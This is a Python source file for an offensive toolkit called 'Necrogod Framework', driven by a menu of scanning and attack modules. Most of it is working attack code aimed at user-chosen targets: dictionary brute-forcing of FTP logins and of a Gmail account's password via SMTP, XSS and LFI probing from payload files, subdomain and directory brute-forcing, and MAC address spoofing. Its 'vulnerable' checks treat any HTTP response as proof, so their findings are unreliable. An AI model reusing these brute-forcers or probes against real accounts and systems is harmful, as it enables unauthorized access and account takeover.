#!/usr/bin/python3

import socket
import os 
import sys
import nmap
import pexpect
import nmap3
from datetime import datetime
# We import the ipaddress module. We want to use the ipaddress.ip_address(address)
# method to see if we can instantiate a valid ip address to test.
import ipaddress
# We need to create regular expressions to ensure that the input is correctly formatted.
import re
import ftplib
import requests
import smtplib
from termcolor import colored
import hashlib
import time
import subprocess


def basicScanner() :
    
    port_range_pattern = re.compile("([0-9]+)-([0-9]+)")
# Initialising the port numbers, will be using the variables later on.
    port_min = 0
    port_max = 65535
    open_ports = []
    while True:
        ip_add_entered = input("\nPlease enter the ip address that you want to scan: ")
        try:
            ip_address_obj = ipaddress.ip_address(ip_add_entered)
        # The following line will only execute if the ip is valid.
            print("You entered a valid ip address.")
            break
        except:
            print("You entered an invalid ip address")
    

    while True:
    # You can scan 0-65535 ports. This scanner is basic and doesn't use multithreading so scanning all
    # the ports is not advised.
        print("Please enter the range of ports you want to scan in format: <int>-<int> (ex would be 60-120)")
        port_range = input("Enter port range: ")
    # We pass the port numbers in by removing extra spaces that people sometimes enter. 
    # So if you enter 80 - 90 instead of 80-90 the program will still work.
        port_range_valid = port_range_pattern.search(port_range.replace(" ",""))
        if port_range_valid:
        # We're extracting the low end of the port scanner range the user want to scan.
            port_min = int(port_range_valid.group(1))
        # We're extracting the upper end of the port scanner range the user want to scan.
            port_max = int(port_range_valid.group(2))
        break

# Basic socket port scanning
    for port in range(port_min, port_max + 1):
    # Connect to socket of target machine. We need the ip address and the port number we want to connect to.
        try:
        # Create a socket object
        # You can create a socket connection similar to opening a file in Python. 
        # We can change the code to allow for domain names as well.
        # With socket.AF_INET you can enter either a domain name or an ip address 
        # and it will then continue with the connection.
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            # You want to set a timeout for the socket to try and connect to the server. 
            # If you make the duration longer it will return better results. 
            # We put it at 0.5s. So for every port it scans it will allow 0.5s 
            # for a successful connection.
                s.settimeout(0.5)
            # We use the socket object we created to connect to the ip address we entered and the port number. 
            # If it can't connect to this socket it will cause an exception and the open_ports list will not 
            # append the value.
                s.connect((ip_add_entered, port))
            # If the following line runs then then it was successful in connecting to the port.
                open_ports.append(port)
        except:
            pass
    for port in open_ports:
        print(f"Port {port} is open on {ip_add_entered}.")

def retBanner(ip,port):
    try:
        socket.setdefaulttimeout(5)
        s=socket.socket()
        s.connect((ip,port))
        banner=s.recv(1024)
        return banner
    except:
        return    

def bannergrabber():
    ip= input("Enter Your ip or Website you Want to Scan and Grab the banner:  ")
    port_lst =(input("Enter the required ports separating with a space( ):  "))
    ports = port_lst.split()
    print(ports)
    for port in ports:
        #port=80
        banner=retBanner(ip,int(port))
        if banner:
            
            print(f"[++] {ip} : port no : {port} : {banner}")


def os(ip,nmap):
    results = nmap.nmap_os_detection(ip)
    print(results)

def anonlogin(host):
	try:
		ftp= ftplib.FTP(host)
		ftp.login('Anonymous', '')
		print(f"[++]Anonymous login is available on {host}")
		ftp.quit()
		return True
	except:
		print(f"Anonymous FTP Login is Not Allowed on {host}")    

def bruteforce_ftp(ip,user,passw):
	ftp = ftplib.FTP(ip)
	try:
		ftp.login(user,passw)
		ftp.quit
		print('(+) Found credentials')
		print(f'User: {user}\nPassword: {passw}')
	except:
		print("(-) Fail credentials")

def btfsftp(ip):
	#ip = "192.168.202.129"
	users = open('user.txt','r')
	users = users.read().split('\n')
	passwords = open("password.txt",'r')
	passwords = passwords.read().split('\n')    
	for user in users:
		for password in passwords:
				bruteforce_ftp(ip,user,password)

def chkcloudflr():
	website = input("Enter A Full Name of Website to Check Whether it is Using CloudFlare or not: \n=>")
	word = 'cloudflare'
	url = requests.get(website)
	headers = dict(url.headers)
	verify = False
	for header in headers:
		if word in headers[header].lower():
			verify = True
			break
	if verify == True:
		print(website +" have CloudFlare")
	else:	
		print("Website without CloudFlare")

def requrl(url):
	try:
		return requests.get(url)
	except:
		pass

def requrlpostversion(url):
	try:
		return requests.post(url)
	except:
		pass

def gmailbrtfrc():
	smtpserver = smtplib.SMTP("smtp.gmail.com",587)
	smtpserver.ehlo()
	smtpserver.starttls()
	user= input("Enter The Target Email id: \n=>")
	passwdfile= input("Enter The Full Path of Your Password File if it is Not Present in The Same directory of This  Script: \n=>")
	File = open(passwdfile, "r")
	for password in File:
		password = password.strip("\n")
		try:
			smtpserver.login(user, password)
			print(colored("[++] Password Found %s " %password, 'green'))
			break
		except:
			print(colored("[--] Password not Found with %s " %password, 'red'))

def clickjacktest():
	url=input("Enter The Full Name of The Website (EXAMPLE: https://www.google.com)\n=>")
	headers=requests.get(url).headers
	if 'X-Frame-Options' in headers:
		print(colored(f"{url} is not Vulnerable with Basic Click Jacking","red"))
	else:
		print(colored(f"{url} is Vulnerable with Basic Click Jacking","green"))


def md5(passw):
	encrypted = hashlib.md5(passw)
	print(colored(encrypted.hexdigest(), 'green'))

def sha1(passw):
	encrypted = hashlib.sha1(passw)
	print(colored(encrypted.hexdigest(), 'green'))

def sha256(passw):
	encrypted = hashlib.sha256(passw)
	print(colored(encrypted.hexdigest(), 'green'))

def sha512(passw):
	encrypted = hashlib.sha512(passw)
	print(colored(encrypted.hexdigest(), 'green'))


def wordtohash():
	print("Welcome to Word to Hash Converter")
	print(colored("[1]. MD5\n[2]. SHA1\n[3]. SHA256\n[4]. SHA512\n[#]. Exit", 'red'))
	mode = int(input("=> "))
	word = input("Enter The Word You Want To Convert: ")
	word = word.encode('utf-8')
	if mode == 1:
		md5(word)
	elif mode == 2:
		sha1(word)
	elif mode == 3:
		sha256(word)
	elif mode == 4:
		sha512(word)
	else:
		exit()

def hashidntfr():
	print("Only Indentify MD5 - SHA1 - SHA256 - SHA512")
	my_hash = input('Enter The Hash You Want to Identify:')
	print("Identifying the encrypton method")
	time.sleep(1)
	if len(my_hash) == 32:
		print("(+) MD5 hash")
	elif len(my_hash) == 40:
		print("(+) SHA1 hash")
	elif len(my_hash) == 64:
		print("(+) SHA256")
	elif len(my_hash) == 128:
		print("(+) SHA512")
	else:
		print("We can't decrypt your hash")

def changemac(interface,mac):
	subprocess.call(["ifconfig",interface,"down"])
	subprocess.call(["ifconfig",interface,"hw","ether",mac])
	subprocess.call(["ifconfig",interface,"up"])

def macchanger():
	print("This Module Works Only as ROOT User")
	interface=input("Enter Interface to Change Mac Address on: \n=>")
	mac=input("Enter The New Mac Address to Change to: \n=>")
	before_change= subprocess.check_output(["ifconfig",interface])
	changemac(interface,mac)
	after_change= subprocess.check_output(["ifconfig",interface])

	if before_change==after_change:
		print("[--] Failled to Change Mac Address to: "+mac)
	else:
		print("Mac Address Changed Successfully to : "+mac)



print("-"*80)
print("-"*80)
print ("Welcome to Necrogod Framework now see the list of what this tool can do for you")
print("-"*80)
print("-"*80)

print(colored("""Please Enter Your Choice 
             1. Simple Port Scan
             2. Bannar Grabiing of Given Open Ports
             3. OS Detection of A Server
             4. Find Subdomains of A Website
             5. Check Cloudflare Validation
             6. Basic XSS Checking 
             7. Check Basic LFI Vulnerability
             8. Anonymouse FTP Login Test
             9. BRUTE-FORCE FTP Login
            10. Click Jacking Vulnerability Test
            11. Find Hidden Directories of a Website
            12. Brute Force Gmail
            13. Hash Detector(md5,sha)
            14. Convert Word To Hash
            15. MAC Changer
            16. Email Harvester
            17. Phone Number Information Gathering
            18. Email Information Gathering """ ,'yellow'))

x=int(input("\n\n[++]Your Choice : "))
if x == 1:
    t1= datetime.now()
    basicScanner()
    t2=datetime.now()
    t3=t2-t1
    print (f"Time taken for Scanning {t3} Seconds")
elif x == 2:
    bannergrabber()
elif x == 3:
    nmap=nmap3.Nmap()
    ip= input("Enter the ip which you want to scan: \n=>")
    os(ip,nmap)
elif x == 4:
    target_url= input("\n\nEnter The URL For Finding Possible Sub-Domanins\n PUT DOMAIN NAME ONLY NOTHING ELSE  (EXAMPLE:  => google.com): \n=>")
    file = open("sub.txt", "r")
    for line in file:
	    word=line.strip()
	    full_url = "http://" + word + "." + target_url
	    resp= requrl(full_url)
	    if resp:
		    print("[++] Discovered Sub-Domain is :  " + full_url)
elif x == 5:
    chkcloudflr()
elif x == 6:
    print("\n\n ***** THIS DOES A BASIC XSS SCAN ONLY USING THE URL PARAMETER BY GIVING MALICIOUS URL AND TAKING RESPONSE IF RESPONSE COME THEN WE CALL IT VULNERABLE *****\n")

    target_url= input("\n\nEnter The URL For Finding Whether The Site is Vulnerable With XSS Or Not \n PUT TOTAL URL  (EXAMPLE:  => http://www.google.com): \n IN CASE OF IP PUT http://<IP>\n\n=>")

    file = open("xsslst.txt", "r")
    for line in file:
	    word=line.strip("\n")
	    full_url = target_url+word
	    resp= requrlpostversion(full_url)
	    try:
		    if resp:
			    print("[++] The Target is Vulnerable and The XSS Executing Command is:  " + full_url)
		    else:
			    pass
	    except KeyboardInterrupt:
		    exit()
elif x == 7:
    print("\n\n ***** THIS DOES A BASIC LFI SCAN ONLY USING THE URL PARAMETER BY GIVING MALICIOUS URL AND TAKING RESPONSE IF RESPONSE COME THEN WE CALL IT VULNERABLE *****\n")

    target_url= input("\n\nEnter The URL For Finding Whether The Site is Vulnerable With LFI Or Not \n PUT TOTAL URL  (EXAMPLE:  => http://www.google.com): \n IN CASE OF IP PUT http://<IP>\n\n=>")

    file = open("payload_lfi.txt", "r")
    for line in file:
	    word=line.strip()
	    full_url = target_url+word
	    resp= requrl(full_url)
	    try:
		    if resp:
			    print("[++] The Target is Vulnerable and The LFI Executing Command is:  " + full_url)
	    except KeyboardInterrupt:
		    exit()
elif x == 8:
    host = input("Enter The ip of The Host: \n=>")
    anonlogin(host)
elif x == 9:
    ip = input("Enter The ip For FTP BRUTE FORCE Attack: \n=>")
    try:
	    btfsftp(ip)
    except KeyboardInterrupt():
	    exit()
elif x == 10:
    clickjacktest()
elif x == 11:
    target_url= input("Enter The URL For Finding Hidden Directory: \n=>")
    file = open("dir.txt", "r")
    for line in file:
	    word=line.strip("\n")
	    full_url = target_url + "/" + word
	    resp= requrl(full_url)
	    if resp:
		    print("[++] Discovered Directory at :  " + full_url)
elif x == 12:
    gmailbrtfrc()
elif x == 13:
    hashidntfr()
elif x == 14:
    wordtohash()
elif x == 15:
    macchanger()
elif x == 16:
    pass
elif x == 17:
    pass
elif x == 18:
    pass
else:
    pass
